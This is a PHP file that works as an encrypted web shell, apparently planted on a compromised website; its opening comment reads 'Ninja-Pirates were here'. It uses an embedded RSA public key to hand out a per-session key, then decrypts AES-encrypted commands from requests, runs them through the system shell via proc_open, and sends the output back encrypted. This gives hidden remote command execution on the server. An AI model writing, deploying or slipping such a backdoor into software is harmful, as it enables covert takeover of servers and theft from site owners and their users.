<?php
// Ninja-Pirates were here; this site is now NP-complete.

session_start();

if ($_SESSION["r"] && $_REQUEST["c"]) {
    $r = $_SESSION["r"];
    $c = $_REQUEST["c"];

    $k1 = substr($r, -64, 32);
    $k2 = substr($r, -32, 32);
    $i = "<<NinjaPirates>>";

    $p = openssl_decrypt($c, "AES-256-CBC", $k2, 0, $i);
    if (!$p) {
        http_response_code(500);
        die();
    }

    $d = array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w"));
    $sh = proc_open("sh", $d, $io);
    fwrite($io[0], $p);
    fclose($io[0]);
    $p = stream_get_contents($io[1]);
    fclose($io[1]);
    fclose($io[2]);
    proc_close($sh);

    $c = openssl_encrypt($p, "AES-256-CBC", $k1, 0, $i);
    echo $c;

} else {
    $k = openssl_get_publickey(<<<EOF
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD4mlUi+rNbppdDCfiV46AznT3c
Jh6Jx2u+HJu0HoqAwAJs9MxZYSk9s7sCaGmngf3FMDJvHG5Rnb9qXC3TAAauWTu+
TV+A+A3l5WU+9NMR1RF1WGACTRcHZEnCvdIUDRNHygKTRp+TPq2jfY7DwHnwtqdc
+W2ArHhSOuwD2Jc/gQIDAQAB
-----END PUBLIC KEY-----
EOF
    );
    $r = "\0" . random_bytes(127);
    $_SESSION["r"] = $r;
    $c = "";
    openssl_public_encrypt($r, $c, $k, OPENSSL_NO_PADDING);
    echo base64_encode($c);
}

?>